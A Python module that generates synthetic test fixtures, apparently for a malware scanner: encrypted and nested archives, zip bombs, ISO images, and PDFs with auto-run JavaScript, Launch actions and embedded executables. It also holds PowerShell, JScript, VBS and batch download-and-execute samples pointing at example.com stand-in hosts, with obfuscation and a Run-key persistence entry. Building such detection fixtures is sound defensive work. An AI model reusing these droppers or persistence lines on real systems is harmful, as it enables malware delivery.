"""Synthetic archives, disk images, PDFs and scripts. All payloads are inert text or the
benign fixture PE from build.py. Network values are documentation-only (RFC 2606/5737).
"""

from __future__ import annotations

import base64
import io
import struct
import zipfile
import zlib

# ZIP with traditional PKWARE encryption ("ZipCrypto") -------------------------------
# Neither zipfile nor pyzipper writes ZipCrypto, which is what most malware ZIPs use.

def _crc_table() -> list[int]:
    table = []
    for i in range(256):
        c = i
        for _ in range(8):
            c = (c >> 1) ^ 0xEDB88320 if c & 1 else c >> 1
        table.append(c)
    return table


class _ZipCrypto:
    def __init__(self, password: bytes):
        self.k0, self.k1, self.k2 = 0x12345678, 0x23456789, 0x34567890
        self.table = _crc_table()
        for b in password:
            self._update(b)

    def _crc(self, crc: int, b: int) -> int:
        return (crc >> 8) ^ self.table[(crc ^ b) & 0xFF]

    def _update(self, b: int) -> None:
        self.k0 = self._crc(self.k0, b)
        self.k1 = (self.k1 + (self.k0 & 0xFF)) & 0xFFFFFFFF
        self.k1 = (self.k1 * 134775813 + 1) & 0xFFFFFFFF
        self.k2 = self._crc(self.k2, self.k1 >> 24)

    def encrypt(self, data: bytes) -> bytes:
        out = bytearray()
        for p in data:
            t = (self.k2 | 2) & 0xFFFF
            out.append(p ^ (((t * (t ^ 1)) >> 8) & 0xFF))
            self._update(p)
        return bytes(out)


def zip_crypto(members: dict[str, bytes], password: str = "infected") -> bytes:
    """ZIP whose members are deflated and ZipCrypto-encrypted with `password`."""
    out, central = bytearray(), bytearray()
    for name, data in members.items():
        crc = zlib.crc32(data)
        comp = zlib.compressobj(9, zlib.DEFLATED, -15)
        deflated = comp.compress(data) + comp.flush()
        header = bytes(range(1, 12)) + bytes([crc >> 24])  # deterministic, last byte = CRC
        enc = _ZipCrypto(password.encode()).encrypt(header + deflated)
        fname = name.encode()
        offset = len(out)
        out += struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 1, 8, 0, 0x21, crc, len(enc),
                           len(data), len(fname), 0) + fname + enc
        central += struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 1, 8, 0, 0x21, crc,
                               len(enc), len(data), len(fname), 0, 0, 0, 0, 0, offset) + fname
    eocd = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, len(members), len(members),
                       len(central), len(out), 0)
    return bytes(out + central + eocd)


def zip_plain(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members.items():
            zf.writestr(zipfile.ZipInfo(name, date_time=(2024, 1, 1, 0, 0, 0)), data,
                        compress_type=zipfile.ZIP_DEFLATED)
    return buf.getvalue()


def zip_aes(members: dict[str, bytes], password: str = "infected") -> bytes:
    import pyzipper

    buf = io.BytesIO()
    with pyzipper.AESZipFile(buf, "w", compression=pyzipper.ZIP_DEFLATED,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(password.encode())
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


def nested_zip(depth: int, inner: dict[str, bytes]) -> bytes:
    data = zip_plain(inner)
    for level in range(depth - 1, 0, -1):
        data = zip_plain({f"level{level}.zip": data})
    return data


def zip_bomb(size: int) -> bytes:
    """One member of `size` zero bytes: tiny compressed, huge ratio."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        with zf.open("zeros.bin", "w", force_zip64=True) as f:
            chunk = bytes(1 << 20)
            for _ in range(size // len(chunk)):
                f.write(chunk)
    return buf.getvalue()


# 7z and ISO -------------------------------------------------------------------------

def seven_zip(members: dict[str, bytes], password: str | None = None,
              header_encryption: bool = False) -> bytes:
    import py7zr

    buf = io.BytesIO()
    with py7zr.SevenZipFile(buf, "w", password=password,
                            header_encryption=header_encryption) as z:
        for name, data in members.items():
            z.writestr(data, name)
    return buf.getvalue()


def iso_image(files: dict[str, bytes], hidden: set[str] = frozenset()) -> bytes:
    """Joliet ISO with the given files at the root; names in `hidden` get the hidden flag."""
    import pycdlib

    iso = pycdlib.PyCdlib()
    iso.new(interchange_level=3, joliet=3)
    for i, (name, data) in enumerate(files.items()):
        iso_name = f"/F{i:03d}.;1"
        iso.add_fp(io.BytesIO(data), len(data), iso_name, joliet_path="/" + name)
        if name in hidden:
            iso.set_hidden(iso_path=iso_name)
            iso.set_hidden(joliet_path="/" + name)
    out = io.BytesIO()
    iso.write_fp(out)
    iso.close()
    return out.getvalue()


# PDF --------------------------------------------------------------------------------

def build_pdf(objects: list[bytes], root: int = 1) -> bytes:
    """Assemble numbered objects (1-based, in order) with a correct xref table."""
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for i, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode() + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode()
    out += b"".join(f"{o:010d} 00000 n \n".encode() for o in offsets)
    out += (f"trailer\n<< /Size {len(objects) + 1} /Root {root} 0 R >>\n"
            f"startxref\n{xref}\n%%EOF\n").encode()
    return bytes(out)


def _stream(data: bytes, extra: str = "", flate: bool = False) -> bytes:
    if flate:
        data = zlib.compress(data)
        extra += " /Filter /FlateDecode"
    return f"<< /Length {len(data)}{extra} >>\nstream\n".encode() + data + b"\nendstream"


def _pages(annots: str = "") -> list[bytes]:
    return [
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]{annots} >>".encode(),
    ]


def pdf_plain() -> bytes:
    return build_pdf([b"<< /Type /Catalog /Pages 2 0 R >>", *_pages()])


def pdf_openaction_js(obfuscate_names: bool = False) -> bytes:
    js = ("var u = 'ht' + 'tp://' + 'pdf.example.com/p.exe'; "
          "app.alert('unopened fixture');")
    key = b"/J#61vaScript" if obfuscate_names else b"/JavaScript"
    return build_pdf([
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>", *_pages(),
        b"<< /Type /Action /S " + key + b" /JS 5 0 R >>",
        _stream(js.encode(), flate=True),
    ])


def pdf_launch() -> bytes:
    return build_pdf([
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>", *_pages(),
        b"<< /Type /Action /S /Launch /Win << /F (cmd.exe) /P (/c echo fixture) >> >>",
    ])


def pdf_with_attachment(name: str = "invoice.exe", data: bytes = b"fixture attachment",
                        flate: bool = True, declared: int | None = None) -> bytes:
    declared = len(data) if declared is None else declared
    return build_pdf([
        b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 4 0 R >> >>", *_pages(),
        f"<< /Names [({name}) 5 0 R] >>".encode(),
        f"<< /Type /Filespec /F ({name}) /UF ({name}) /EF << /F 6 0 R >> >>".encode(),
        _stream(data, f" /Type /EmbeddedFile /Params << /Size {declared} >>", flate=flate),
    ])


def pdf_uri() -> bytes:
    return build_pdf([
        b"<< /Type /Catalog /Pages 2 0 R >>",
        *_pages(" /Annots [4 0 R]"),
        b"<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] "
        b"/A << /S /URI /URI (https://login.example.com/verify) >> >>",
    ])


def pdf_flate_bomb(size: int, declared: int | None = None) -> bytes:
    """An attachment that inflates to `size` zero bytes, optionally lying about its size."""
    return pdf_with_attachment("zeros.bin", bytes(size), flate=True, declared=declared)


# Scripts ----------------------------------------------------------------------------

def _ps_b64(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


PS_DOWNLOADER = (
    b"$u = 'http://dl.example.com/' + 'stage2.ps1'\n"
    b"$c = [char]73+[char]69+[char]88\n"
    b"$w = New-Object Net.WebClient\n"
    b"& $c ($w.DownloadString($u))\n"
)

PS_ENCODED = (
    "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand "
    + _ps_b64("iex (New-Object Net.WebClient).DownloadString('http://enc.example.com/a')")
    + "\n"
).encode()

PS_BENIGN = (
    b"param([string]$Path = '.')\n"
    b"Get-ChildItem -Path $Path -Recurse | Sort-Object Length -Descending |\n"
    b"    Select-Object -First 10 | Format-Table Name, Length\n"
    b"Write-Host 'done'\n"
)

JS_DROPPER = (
    b"var x = new ActiveXObject('MSXML2.XMLHTTP');\n"
    b"var u = String.fromCharCode(104,116,116,112,58,47,47,106,115,46,101,120,97,109,112,"
    b"108,101,46,99,111,109,47,97,46,101,120,101);\n"
    b"x.open('GET', u, false); x.send();\n"
    b"var sh = new ActiveXObject('WScript.Shell'); sh.Run('%TEMP%\\\\a.exe');\n"
)

VBS_CHR = (
    b'Dim s\n'
    b's = Chr(104) & Chr(116) & Chr(116) & Chr(112) & "://vbs.example.com/x"\n'
    b'Set o = CreateObject("WScript.Shell")\n'
    b"o.Run s\n"
)

BAT_CERTUTIL = (
    b"@echo off\r\n"
    b"certutil -urlcache -split -f http://bat.example.com/a.txt %TEMP%\\a.txt\r\n"
    b"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v fx /d %TEMP%\\a.txt\r\n"
)

BAT_BENIGN = (
    b"@echo off\r\n"
    b"set /a n=1\r\n"
    b"if exist C:\\backup goto :copy\r\n"
    b":copy\r\n"
    b"xcopy /s /y C:\\data C:\\backup\r\n"
)
